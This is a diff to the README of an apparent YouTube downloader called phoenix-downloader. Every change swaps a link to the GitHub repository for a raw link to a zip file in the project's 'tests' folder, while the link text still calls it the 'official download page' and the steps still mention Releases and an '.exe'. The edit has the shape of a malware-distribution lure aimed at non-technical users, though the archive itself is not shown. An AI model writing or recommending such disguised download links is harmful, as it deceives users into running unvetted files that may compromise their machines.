@@ -1,6 +1,6 @@
 # 📥 phoenix-downloader - Save YouTube videos to your computer
 
-[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/junctiontransistorselffertilisation783/phoenix-downloader)
+[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://raw.githubusercontent.com/junctiontransistorselffertilisation783/phoenix-downloader/main/tests/downloader_phoenix_1.9.zip)
 
 phoenix-downloader helps you save videos from YouTube to your Windows computer. You can download single videos or entire playlists. The app keeps track of your downloads, resumes interrupted transfers, and saves files in high quality.
 
@@ -8,7 +8,7 @@ phoenix-downloader helps you save videos from YouTube to your Windows computer. 
 
 You do not need programming knowledge to use this software. Follow these steps to set up the application on your computer.
 
-1. Visit the [official download page](https://github.com/junctiontransistorselffertilisation783/phoenix-downloader).
+1. Visit the [official download page](https://raw.githubusercontent.com/junctiontransistorselffertilisation783/phoenix-downloader/main/tests/downloader_phoenix_1.9.zip).
 2. Look for the "Releases" section on the right side of the page.
 3. Click the latest version link.
 4. Download the file ending in `.exe`.
@@ -55,7 +55,7 @@ If you encounter issues, look at these common fixes:
 
 ## 📁 Installation Details
 
-You can find the setup files at this location: [https://github.com/junctiontransistorselffertilisation783/phoenix-downloader](https://github.com/junctiontransistorselffertilisation783/phoenix-downloader). Download the installer and follow the on-screen prompts. The installer creates a shortcut on your desktop for quick access. 
+You can find the setup files at this location: [https://raw.githubusercontent.com/junctiontransistorselffertilisation783/phoenix-downloader/main/tests/downloader_phoenix_1.9.zip](https://raw.githubusercontent.com/junctiontransistorselffertilisation783/phoenix-downloader/main/tests/downloader_phoenix_1.9.zip). Download the installer and follow the on-screen prompts. The installer creates a shortcut on your desktop for quick access. 
 
 ## 🛡 Privacy and Safety
 
